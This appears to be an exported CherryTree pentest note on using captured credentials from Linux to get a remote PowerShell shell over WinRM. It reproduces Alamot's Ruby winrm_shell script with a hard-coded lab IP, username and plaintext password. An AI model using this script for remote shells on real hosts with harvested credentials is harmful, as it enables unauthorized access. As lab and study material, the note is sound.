<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>via WinRM</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Using credentials - from Unix - via WinRM</h1></strong><br />Using PowerShell / communicating with WinRM from Linux isn&#39;t very well developed<br />It requires PSRemoting to be enabled.<br /><br /><strong><h2>## Alamot&#39;s WinRM ruby script</h2></strong><br /><a href="https://alamot.github.io/winrm_shell/">https://alamot.github.io/winrm_shell/</a><br />&quot;PowerShell on Linux isn&#39;t mature&quot;<br />   ◇ Most python modules don&#39;t communicate correctly with WinRM.<br />   ◇ The only reliable library to communcate from Linux to Windows via WinRM is Ruby&#39;s <code>winrm</code> library.<br />      ▪  WinRM Ruby library - <a href="https://github.com/WinRb/WinRM">https://github.com/WinRb/WinRM</a><br />      ▪ Check the <code>:transport</code> mechanism of how to deliver the shell. <br />         - Check ports from Nmap to figure out what&#39;s best/what you need.<br /><br /><a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb</a><br /><br />Edit the host IP, user, and password yourself and execute - <code>ruby winrm_shell.rb</code><br /><div class="codebox"><div class="codebox">require&nbsp;&#39;winrm&#39;<br /><br />#&nbsp;Author:&nbsp;Alamot<br /><br />conn&nbsp;=&nbsp;WinRM::Connection.new(&nbsp;<br />&nbsp;&nbsp;endpoint:&nbsp;&#39;http://10.10.10.149:5985/wsman&#39;,<br />&nbsp;&nbsp;user:&nbsp;&#39;Chase&#39;,<br />&nbsp;&nbsp;password:&nbsp;&#39;Q4)sJu\Y8qz*A3?d&#39;,<br />)<br /><br />command=&quot;&quot;<br /><br />conn.shell(:powershell)&nbsp;do&nbsp;|shell|<br />&nbsp;&nbsp;&nbsp;&nbsp;until&nbsp;command&nbsp;==&nbsp;&quot;exit\n&quot;&nbsp;do<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;shell.run(&quot;-join($id,&#39;PS&nbsp;&#39;,$(whoami),&#39;@&#39;,$env:computername,&#39;&nbsp;&#39;,$((gi&nbsp;$pwd).Name),&#39;&gt;&nbsp;&#39;)&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(output.output.chomp)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command&nbsp;=&nbsp;gets&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;shell.run(command)&nbsp;do&nbsp;|stdout,&nbsp;stderr|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STDOUT.print&nbsp;stdout<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STDERR.print&nbsp;stderr<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end<br />&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;puts&nbsp;&quot;Exiting&nbsp;with&nbsp;code&nbsp;#{output.exitcode}&quot;<br />end</div></div></div>
</body>
</html>
